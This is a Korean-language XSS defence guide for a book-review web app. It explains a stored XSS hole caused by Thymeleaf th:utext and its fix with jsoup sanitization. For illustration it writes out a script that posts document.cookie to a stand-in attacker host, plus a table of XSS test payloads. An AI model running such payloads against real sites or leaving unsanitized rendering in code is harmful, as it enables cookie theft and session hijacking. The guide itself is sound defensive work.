# 🛡️ XSS 방어 가이드

## ❌ 발견된 취약점

### 1. **th:utext 사용으로 인한 XSS 취약점**
```html
<!-- ❌ 위험 -->
<div th:utext="${review.content}">
```

**문제점:**
- 사용자가 `<script>alert('XSS')</script>` 입력 시 그대로 실행됨
- 쿠키 탈취, 세션 하이재킹 가능
- 다른 사용자에게도 영향 (Stored XSS)

**공격 시나리오:**
```javascript
// 악의적 사용자가 리뷰에 입력:
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>

// 다른 사용자가 해당 리뷰를 볼 때마다 쿠키 탈취됨
```

---

## ✅ 적용된 보안 조치

### 1. **서버 사이드 HTML 새니타이즈 (jsoup)**

#### build.gradle.kts
```kotlin
implementation("org.jsoup:jsoup:1.17.2")
```

#### HtmlSanitizer.kt

> ⚠️ 허용 태그·속성 목록은 코드가 바뀔 때마다 갱신되므로 이 문서에 스니펫을 복사하지 않는다.
> 정본은 [`src/main/kotlin/com/woocurlee/bookview/util/HtmlSanitizer.kt`](src/main/kotlin/com/woocurlee/bookview/util/HtmlSanitizer.kt) 참고.

`Safelist.relaxed()`를 기반으로 아래와 같이 확장/제한한다 (자세한 값은 코드 참고):
- 허용 태그 추가: 제목(`h1`~`h6`), 취소선(`s`)
- 허용 속성 추가: `p`/`span`의 `class`
- 허용 프로토콜 제한: `a[href]`는 `http`/`https`/`mailto`만, `img[src]`는 `http`/`https`만 (`javascript:`, `data:` 등 차단)

**차단되는 태그/속성 (기본 Safelist 정책):**
- `<script>` - JavaScript 실행
- `<iframe>` - 외부 사이트 임베드
- `<object>`, `<embed>` - 플러그인 실행
- `onclick`, `onerror` 등 이벤트 핸들러

### 2. **ReviewService 새니타이즈 적용**

> 정본은 [`src/main/kotlin/com/woocurlee/bookview/service/ReviewService.kt`](src/main/kotlin/com/woocurlee/bookview/service/ReviewService.kt)의 `createReview`, `updateReview` 참고.

- `title`, `quote`: `HtmlSanitizer.toPlainText()`로 HTML 전부 제거
- `content`: `HtmlSanitizer.sanitize()`로 허용된 태그만 유지
- 생성/수정 모두 저장 직전(save 호출 전)에 새니타이즈하여, DB에는 항상 안전한 값만 저장됨

---

## 🔍 보안 레이어

### **다층 방어 (Defense in Depth)**

```
사용자 입력
    ↓
┌─────────────────────────────────┐
│ 1. 클라이언트 검증 (UX용)       │  ← 쉽게 우회 가능
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ 2. 서버 검증 + HTML 새니타이즈  │  ✅ 핵심 방어선
│    (ReviewService)              │
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ 3. 데이터베이스 저장             │  ← 이미 안전한 데이터
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ 4. 렌더링 (th:utext)            │  ← 안전한 HTML만 존재
└─────────────────────────────────┘
```

---

## 🧪 테스트 케이스

### **악의적 입력 예시**

| 입력 | 새니타이즈 후 | 설명 |
|------|--------------|------|
| `<script>alert('XSS')</script>` | (제거됨) | 스크립트 차단 |
| `<img src=x onerror=alert('XSS')>` | `<img src="x">` | 이벤트 핸들러 제거 |
| `<a href="javascript:alert('XSS')">Click</a>` | `<a>Click</a>` | javascript: 프로토콜 차단 |
| `<img src="javascript:alert('XSS')">` | `<img>` | javascript: 프로토콜 차단 |
| `<p onclick="alert('XSS')">Text</p>` | `<p>Text</p>` | onclick 제거 |
| `<iframe src="https://evil.com"></iframe>` | (제거됨) | iframe 차단 |
| `<strong>Bold</strong>` | `<strong>Bold</strong>` | ✅ 안전한 태그 허용 |

---

## 📋 진행 현황

보안 조치 항목별 완료 여부는 문서가 아닌 Jira에서 관리한다 (문서 드리프트 방지).

---

## 🎯 결론

### **적용 전 (취약)**
```kotlin
// 사용자 입력 그대로 저장
reviewRepository.save(review)
```
```html
<!-- 위험한 렌더링 -->
<div th:utext="${review.content}">
```

### **적용 후 (안전)**
```kotlin
// 저장 전 새니타이즈
val sanitized = review.copy(
    content = HtmlSanitizer.sanitize(review.content)
)
reviewRepository.save(sanitized)
```
```html
<!-- 이미 안전한 HTML이므로 th:utext 사용 가능 -->
<div th:utext="${review.content}">
```

**핵심 원칙:**
- ✅ 사용자 입력은 절대 신뢰하지 않는다
- ✅ 서버에서 검증/새니타이즈
- ✅ 다층 방어 전략
- ✅ 허용 태그·속성 목록의 정본은 코드(`HtmlSanitizer.kt`)이며, 이 문서는 스니펫을 복사하지 않는다
